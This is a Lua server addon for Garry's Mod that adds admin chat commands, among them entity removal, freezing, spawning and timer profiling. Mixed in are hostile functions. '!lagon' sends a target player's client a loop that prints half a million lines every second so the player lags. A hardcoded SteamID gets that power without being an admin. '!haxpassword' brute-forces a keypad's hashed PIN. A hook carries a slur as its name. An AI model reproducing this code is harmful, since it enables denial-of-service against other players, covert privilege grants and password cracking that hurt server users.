montoyo = montoyo or {}
montoyo.ARMA = true -- This gives Armageddon (STEAM_0:1:19270279) the right to use both !lagon and !stoplag commands.

montoyo.classMeta = {}
montoyo.classMeta.__call = function(t, ...)
	local obj = {}
	setmetatable(obj, t)

	if t.__construct then
		local state, err = pcall(t.__construct, obj, ...)

		if not state then
			print("Failed to construct class " .. t.__tostring(nil) .. ": " .. (err or "Unknown error."))
			return nil
		end
	end

	return obj
end

montoyo.newClass = function(name)
	local ret = {}

	ret.__index = function(t, k)
		if k then
			return ret[k]
		else
			return nil
		end
	end

	ret.__tostring = function(t)
		return "Montoyo.Class<" .. name .. ">"
	end

	setmetatable(ret, montoyo.classMeta)
	return ret
end

if SERVER then -- Server side!

	ents.Stats = function(maxe)
		local PlyEnts = {}

		for k, v in pairs(ents.GetAll()) do
			if v:IsValid() and v.CPPIGetOwner and v:CPPIGetOwner() then
				if not PlyEnts[v:CPPIGetOwner():GetName()] then
					PlyEnts[v:CPPIGetOwner():GetName()] = 1
				else
					PlyEnts[v:CPPIGetOwner():GetName()] = PlyEnts[v:CPPIGetOwner():GetName()] + 1
				end
			end
		end

		-- Fuck table.sort !
		local OutEnts = {}
		while table.Count(PlyEnts) > 0 do
			local maxK = ""
			local maxV = 0
			
			for k, v in pairs(PlyEnts) do
				if v >= maxV then
					maxK = k
					maxV = v
				end
			end
		
			local tbl = {}
			tbl.name = maxK
			tbl.val = maxV
			
			table.insert(OutEnts, tbl)
			PlyEnts[maxK] = nil
		end

		local max = 1
		for k, v in pairs(OutEnts) do
			if max > maxe then
				return
			end
			
			print("{ENTSTAT} [" .. v.name .. "] has got " .. tostring(v.val) .. " owned entities.")
			max = max + 1
		end
	end

	montoyo.getPlayer = function(name)
		for k, v in pairs(player.GetAll()) do
			if string.find(string.lower(v:GetName()), string.lower(name)) then
				return v
			end
		end

		return nil
	end
	
	montoyo.aboluteAngle = function(angle)
		local div = angle / 360
		local frac = (div - math.floor(div)) * 360
		
		if frac < 0 then
			frac = 360 + frac
		end
		
		return frac
	end

	montoyo.print = FindMetaTable("Player").ChatPrint
	
	montoyo.eyeTrace = function(ply, allowNonOwned)
		local trace = ply:GetEyeTrace()
		if not trace or not trace.Entity or not trace.HitNonWorld then
			montoyo.print(ply, "Please select a valid entity.")
			return nil
		end
		
		trace = trace.Entity
		if not allowNonOwned and (not trace.CPPIGetOwner or not trace:CPPIGetOwner() or trace:CPPIGetOwner():SteamID() ~= ply:SteamID()) then
			montoyo.print(ply, "You don't own this entity.")
			return nil
		end
		
		return trace
	end
	
	montoyo.fbc = function(cls)
		local ret = {}
		for k, v in pairs(ents.GetAll()) do
			if IsValid(v) and v:GetClass():lower():find(cls) then
				table.insert(ret, v)
			end
		end
		
		return ret
	end
	
	FindMetaTable("Entity").GetPO = FindMetaTable("Entity").GetPhysicsObject
	
	montoyo.isChrono = false
	montoyo.oldTimers = {}
	montoyo.timerTime = {}
	montoyo.installTimerHooks = function()
		assert(not montoyo.isChrono, "already monitoring timers")
	
		for k, v in pairs(timer.GetTable()) do
			montoyo.oldTimers[k] = v.Func
			
			v.Func = function()
				local ctime = SysTime()
				montoyo.oldTimers[k]()
				
				if montoyo.timerTime[k] == nil then
					montoyo.timerTime[k] = SysTime() - ctime
				else
					montoyo.timerTime[k] = montoyo.timerTime[k] + (SysTime() - ctime)
				end
			end
		end
		
		montoyo.isChrono = true
	end

	montoyo.restoreTimerHooks = function()
		assert(montoyo.isChrono, "not monitoring timers")
	
		for k, v in pairs(timer.GetTable()) do
			v.Func = montoyo.oldTimers[k]
		end
		
		montoyo.oldTimers = {}
		montoyo.timerTime = {}
		montoyo.isChrono = false
	end

	montoyo.chronoTimers = function(tme)
		assert(type(tme) == "number" and tme > 0, "Invalid time")
		assert(not montoyo.isChrono, "already monitoring timers")
		
		montoyo.installTimerHooks()
		timer.Create("StopChrono", tme, 1, function()
			local tmax = 0
			for k, v in pairs(montoyo.timerTime) do
				if v > tmax then
					tmax = v
				end
			end
			
			tmax = tmax / 3
			
			local colors = { Color(0, 255, 0), Color(255, 255, 0), Color(255, 0, 0) }
			for k, v in pairs(montoyo.timerTime) do
				local level = 3
				if v < tmax then
					level = 1
				elseif v < tmax * 2 then
					level = 2
				end
				
				local calc = math.floor((v / tme) * 1000)
				MsgC(colors[level], tostring(k) .. " tooks about " .. tostring(calc) .. "ms\n")
			end
			
			montoyo.restoreTimerHooks()
		end)
	end
	
	montoyo.commands = {}
	montoyo.registerCommand = function(name, callback, minArgs, adminOnly, usageStr)
		if not name or string.len(name) < 1 then
			print("(montoyo) Tried to register a chat command with no name.")
		end

		if not callback then
			print("(montoyo) Tried to register a chat command with no callbacks.")
		end

		if name[1] == '!' then
			name = string.sub(name, 2)
		end

		local usage = "USAGE: !" .. name

		if minArgs then
			usage = usage .. " "

			for i = 1, minArgs do
				if i ~= 1 then
					usage = usage .. ", "
				end

				usage = usage .. "Argument " .. tostring(i)
			end
		end

		montoyo.commands[name] = {}
		montoyo.commands[name].callback = callback
		montoyo.commands[name].minArgs = minArgs or 0

		if usageStr then
			montoyo.commands[name].usage = "USAGE: !" .. name .. " " .. usageStr
		else
			montoyo.commands[name].usage = usage
		end

		if adminOnly == nil then
			montoyo.commands[name].admin = false
		else
			montoyo.commands[name].admin = adminOnly
		end
	end

	hook.Add("PlayerSay", "MontoyoCommands", function(ply, txt)
		if not ply or not txt then return end
		if txt:len() < 2 then return end
		if txt[1] ~= "!" and txt[1] ~= "." and txt[1] ~= "/" then return end

		local isAdmin = ply:IsAdmin()
		local args = string.Explode("%s", txt, true)
		if table.Count(args) < 1 then
			return
		end
		
		local cmd = string.lower(args[1])
		table.remove(args, 1)

		if string.len(cmd) < 2 then
			return
		end

		local mCmd = montoyo.commands[string.sub(cmd, 2)]
		if mCmd then
			if mCmd.admin and not isAdmin then
				montoyo.print(ply, "You must be admin to run this command.")
				return
			end

			if table.Count(args) < mCmd.minArgs then
				montoyo.print(ply, mCmd.usage)
				return
			end

			local status, err = pcall(mCmd.callback, args, ply, isAdmin)
			if not status then
				if err then
					print("(montoyo) Error on chat command " .. cmd .. ": " .. err)
				end

				montoyo.print(ply, "Internal server error.")
			elseif err then
				montoyo.print(ply, mCmd.usage)
			end
		end
	end)

	montoyo.registerCommand("remove", function(args, ply, isAdmin)
		local trace = montoyo.eyeTrace(ply, isAdmin)
		
		if trace then
			trace:Remove()
		end
	end)

	montoyo.registerCommand("angle", function(args, ply, isAdmin)
		local trace = montoyo.eyeTrace(ply, isAdmin)
		if not trace then return end
			
		if table.Count(args) == 0 then
			montoyo.print(ply, montoyo.aboluteAngle(trace:GetAngles().Pitch) .. ", " .. montoyo.aboluteAngle(trace:GetAngles().Yaw) .. ", " .. montoyo.aboluteAngle(trace:GetAngles().Roll))
		elseif table.Count(args) < 3 then
			return true
		else
			local pitch = tonumber(string.Replace(args[1], ",", "."))
			local yaw = tonumber(string.Replace(args[2], ",", "."))
			local roll = tonumber(string.Replace(args[3], ",", "."))
					
			trace:SetAngles(Angle(pitch, yaw, roll))
		end
			
		return
	end, 0, false, "[pitch yaw roll]")
		
	montoyo.registerCommand("enstats", function(args, ply, isAdmin)
		local maxe = 5
		if table.Count(args) >= 1 then
			maxe = tonumber(args[1])
		end
		
		ents.Stats(maxe)
	end, 0, true, "[maxEntries=5]")
	
	montoyo.registerCommand("lagon", function(args, ply, isAdmin)
		if not isAdmin and (ply:SteamID() ~= "STEAM_0:1:19270279" or not montoyo.ARMA) then
			return
		end
	
		local target = montoyo.getPlayer(args[1])
		if not target then
			montoyo.print(ply, "Cannot find player " .. args[1])
			return
		end
		
		target:SendLua("timer.Create(\"Loop\", 1, 0, function() for i = 0, 500000 do print(\"Lag\") end end)")
		montoyo.print(ply, target:GetName() .. " now lags like shit.")
	end, 1, false, "playerName")
	
	montoyo.registerCommand("stoplag", function(args, ply, isAdmin)
		if not isAdmin and (ply:SteamID() ~= "STEAM_0:1:19270279" or not montoyo.ARMA) then
			return
		end
	
		local target = montoyo.getPlayer(args[1])
		if target == nil then
			montoyo.print(ply, "Cannot find player " .. args[1])
			return
		end
		
		target:SendLua("timer.Remove(\"Loop\")")
		montoyo.print(ply, target:GetName() .. " doesn't lag anymore.")
	end, 1, false, "playerName")
	
	montoyo.registerCommand("removeclass", function(args, ply, isAdmin)
		local count = 0
	
		if table.Count(args) <= 0 then
			local trace = montoyo.eyeTrace(ply, true)
			if not trace then return end

			if trace:GetClass() == "prop_physics" then
				montoyo.print(ply, "NOOOOOOOOO!")
				return
			end
			
			for k, v in pairs(ents.FindByClass(trace:GetClass())) do
				v:Remove()
				count = count + 1
			end
		else
			local cls = args[1]
			if cls:len() < 2 then return true end
			
			if cls[1] == "~" then
				for k, v in pairs(montoyo.fbc(cls:sub(2))) do
					v:Remove()
					count = count + 1
				end
			else
				for k, v in pairs(ents.FindByClass(cls)) do
					v:Remove()
					count = count + 1
				end
			end
		end
		
		montoyo.print(ply, "Removed " .. tostring(count) .. " entities.")
	end, 0, true)
	
	montoyo.registerCommand("removemodel", function(args, ply, isAdmin)
		local trace = montoyo.eyeTrace(ply, true)
		if not trace then return end
		
		local count = 0
		for k, v in pairs(ents.FindByModel(trace:GetModel())) do
			v:Remove()
			count = count + 1
		end
	
		montoyo.print(ply, "Removed " .. tostring(count) .. " entities.")
	end, 0, true)

	montoyo.registerCommand("spawn", function(args, ply, isAdmin)
		local tmpEnt = ents.Create(args[1])
		if not tmpEnt or not tmpEnt:IsValid() then
			montoyo.print(ply, "Invalid entity class name \"" .. args[1] .. "\" !")
			return true
		end
		
		if table.Count(args) >= 2 then
			tmpEnt:SetModel(args[2])
		end
		
		tmpEnt:CPPISetOwner(ply)
		tmpEnt:SetPos(ply:GetEyeTrace().HitPos)
		tmpEnt:Spawn()
		montoyo.print(ply, "Spawned!")
	end, 1, true, "className [modelName]")

	montoyo.registerCommand("usage", function(args, ply, isAdmin)
		local mCmd = montoyo.commands[args[1]]

		if mCmd == nil then
			montoyo.print(ply, "I don't know anything about that command")
			return
		end

		if mCmd.admin and not isAdmin then
			montoyo.print(ply, "You don't have the right to run that command")
			return
		end

		montoyo.print(ply, mCmd.usage)
	end, 1, false, "commandName")

	montoyo.registerCommand("cleardecals", function(args, ply, isAdmin)
		for k, v in pairs(player.GetAll()) do
			if IsValid(v) then
				v:ConCommand("r_cleardecals")
			end
		end
	end, 0, true)

	montoyo.registerCommand("fpsof", function(args, ply, isAdmin)
		local target = montoyo.getPlayer(args[1])	
		if not target then
			montoyo.print(ply, "Cannot find player " .. args[1])
			return true
		end

		target:SendLua("CalculateFPS()")
	end, 1, true, "playerName")

	montoyo.registerCommand("countdown", function(args, ply, isAdmin)
		aowl.CountDown(tonumber(args[2]), args[1], function()
			if #args > 2 then
				table.remove(args, 1)
				table.remove(args, 1)
				hook.Run("PlayerSay", ply, table.concat(args, " "), false)
			end
		end, 2)
	end, 2, true, "reason time [callback]")
	
	montoyo.registerCommand("freeze", function(args, ply, isAdmin)
		local trace = montoyo.eyeTrace(ply, isAdmin)
		
		if trace and IsValid(trace:GetPO()) then
			trace:GetPO():EnableMotion(false)
		end
	end)
	
	montoyo.registerCommand("unfreeze", function(args, ply, isAdmin)
		local trace = montoyo.eyeTrace(ply, isAdmin)
		
		if trace and IsValid(trace:GetPO()) then
			trace:GetPO():EnableMotion(true)
		end
	end)
	
	montoyo.registerCommand("nocollide", function(args, ply, isAdmin)
		local trace = montoyo.eyeTrace(ply, isAdmin)
		
		if trace and IsValid(trace:GetPO()) then
			trace:GetPO():EnableCollisions(false)
		end
	end)
	
	montoyo.registerCommand("collide", function(args, ply, isAdmin)
		local trace = montoyo.eyeTrace(ply, isAdmin)
		
		if trace and IsValid(trace:GetPO()) then
			trace:GetPO():EnableCollisions(true)
		end
	end)
	
	montoyo.registerCommand("nogravity", function(args, ply, isAdmin)
		local trace = montoyo.eyeTrace(ply, isAdmin)
		
		if trace and IsValid(trace:GetPO()) then
			trace:GetPO():EnableGravity(false)
		end
	end)
	
	montoyo.registerCommand("gravity", function(args, ply, isAdmin)
		local trace = montoyo.eyeTrace(ply, isAdmin)
		
		if trace and IsValid(trace:GetPO()) then
			trace:GetPO():EnableGravity(true)
		end
	end)
	
	montoyo.registerCommand("haxpassword", function(args, ply, isAdmin)
		local trace = montoyo.eyeTrace(ply, true)
		if not trace then return end
		
		if trace:GetClass() ~= "gmod_wire_keypad" then
			montoyo.print(ply, "Please point at a valid keypad!")
			return
		end
		
		if trace.Password == nil then
			montoyo.print(ply, "This keypad doesn't have a password!")
			return
		end
		
		for i = 1, 9999 do
			if trace.Password == util.CRC(tostring(i)) then
				montoyo.print(ply, "Password is: " .. tostring(i))
				break
			end
		end
	end, 0, true)

elseif CLIENT then -- Client!

	hook.Add("OnPlayerChat", "Faggot", function(ply, txt, dead, toteam)
		if string.find(txt, ":you:") then
			if not string.find(LocalPlayer():GetName(), ":you:") then -- mm
				local ret = string.Replace(txt, ":you:", LocalPlayer():GetName())
				hook.Run("OnPlayerChat", ply, ret, dead, toteam)
				return true
			end
		end
	end)
	
	-- Note: the following might be dangerous
	montoyo.orig = usermessage.GetTable()["__countdown__"].Function
	
	local CONFIG
	local DrawWarning

	for i = 1, 25 do -- This is safe
		local name, val = debug.getupvalue(montoyo.orig, i)
		if name == "CONFIG" then
			CONFIG = val
		elseif name == "DrawWarning" then
			DrawWarning = val
		end
	end

	if not CONFIG or not DrawWarning then return end -- This is also safe

	usermessage.Hook("__countdown__", function(um)
		local typ = um:ReadShort()
		local time = um:ReadShort()

		CONFIG.Sound = CONFIG.Sound or CreateSound(LocalPlayer(), Sound("ambient/alarms/siren.wav"))


		if typ  == -1 then
			CONFIG.Counting = false
			CONFIG.Sound:FadeOut(2)
			hook.Remove("HUDPaint", "__countdown__")
			return
		end

		CONFIG.Sound:Play()
		CONFIG.StartedCount = CurTime()
		CONFIG.TargetTime = CurTime() + time
		CONFIG.Counting = true

		hook.Add("HUDPaint", "__countdown__", DrawWarning)

		if typ == 0 then
			CONFIG.Warning = "SERVER IS RESTARTING THE LEVEL\nSAVE YOUR PROPS AND HIDE THE CHILDREN!"
		elseif typ == 1 then
			CONFIG.Warning = string.format("SERVER IS CHANGING LEVEL TO %s\nSAVE YOUR PROPS AND HIDE THE CHILDREN!", um:ReadString():upper())
		elseif typ == 2 then
			local txt = um:ReadString()
			if type(txt) == "string" and string.find(txt, ":you:") then -- Our patch (safe)
				txt = string.Replace(txt, ":you:", LocalPlayer():GetName())
			end
			
			CONFIG.Warning = txt
		end
	end)
end
